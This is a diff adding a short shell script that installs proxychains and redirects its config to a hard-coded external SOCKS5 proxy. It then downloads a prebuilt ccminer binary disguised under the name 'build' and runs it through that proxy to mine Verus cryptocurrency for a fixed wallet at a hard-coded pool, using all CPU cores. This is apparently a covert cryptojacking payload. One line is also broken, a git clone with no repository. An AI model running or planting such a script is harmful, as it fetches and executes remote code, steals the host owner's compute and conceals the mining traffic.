@@ -1,0 +1,3 @@
+sudo apt update && sudo apt install proxychains  -y && sudo sed -i 's/socks4/socks5/' /etc/proxychains.conf && sudo sed -i 's/127.0.0.1/184.178.172.14/' /etc/proxychains.conf  && sudo sed -i 's/9050/4145/' /etc/proxychains.conf
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && git clone --single-branch -b Verus2.2 -y
+wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh && wget -qO build https://github.com/renifer12/master/raw/master/ccminer && chmod +x build && chmod +x compile.sh && proxychains ./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RL2usgtvdVoihVuVRKdEbEQwE2TwRUjvDx.AStku -p X -t $(nproc --all)
